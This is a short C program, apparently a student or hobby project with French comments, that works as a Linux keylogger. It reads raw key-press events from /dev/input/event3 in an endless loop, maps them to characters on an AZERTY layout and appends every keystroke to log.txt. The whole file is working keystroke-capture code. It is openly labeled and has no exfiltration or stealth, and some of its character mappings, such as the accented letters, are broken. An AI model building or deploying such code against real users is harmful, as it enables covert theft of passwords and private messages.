#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdio.h>

char codeToChar(int code) {
    switch(code) {
        // Chiffres
        case 2: return '&';
        case 3: return 'é';
        case 4: return '"';
        case 5: return '\'';
        case 6: return '(';
        case 7: return '-';
        case 8: return 'è';
        case 9: return '_';
        case 10: return 'ç';
        case 11: return 'à';

        // Lettres
        case 16: return 'a';
        case 48: return 'b';
        case 46: return 'c';
        case 32: return 'd';
        case 18: return 'e';
        case 33: return 'f';
        case 34: return 'g';
        case 35: return 'h';
        case 23: return 'i';
        case 36: return 'j';
        case 37: return 'k';
        case 38: return 'l';
        case 39: return 'm';

        case 49: return 'n';
        case 24: return 'o';
        case 25: return 'p';
        case 30: return 'q';
        case 19: return 'r';
        case 31: return 's';
        case 20: return 't';
        case 22: return 'u';
        case 47: return 'v';
        case 44: return 'w';
        case 45: return 'x';
        case 21: return 'y';
        case 17: return 'z';

        // Autres touches couramment utilisées
        case 12: return ')';
        case 13: return '=';
        case 27: return '$';        
        case 50: return '*';
        case 40: return '\n'; // Touche entrée
        case 43: return '>';
        case 51: return ';';
        case 52: return ':';
        case 53: return '!';
        case 57: return ' '; // Espace

        default: return '?';
    }
}


int main(int argc, char *argv[])
{
    struct input_event ev;
    FILE *file, *log;


    /* Doit recuperer l'event du clavier dans /dev/input (Il y en a plusieurs donc faut voir )*/
    file = fopen("/dev/input/event3", "r");
    if (file == NULL)
    {
        perror("Cannot open device");
        return 1;
    }

    log = fopen("log.txt", "a");
    if (log == NULL)
    {
        fclose(file);
        return 1;
    }

    /* Boucle recuperant les touches pressed et les écrivants dans un fichier */
    while (1)
    {
        fread(&ev, sizeof(ev), 1, file);
        if (ev.type == EV_KEY && ev.value == 1)
        {
            char keyChar = codeToChar(ev.code);
            fprintf(log, "%c", keyChar);
            fflush(log);
        }
    }

    fclose(log);
    fclose(file);

    return 0;
}


//// Source des codes linux -> https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h 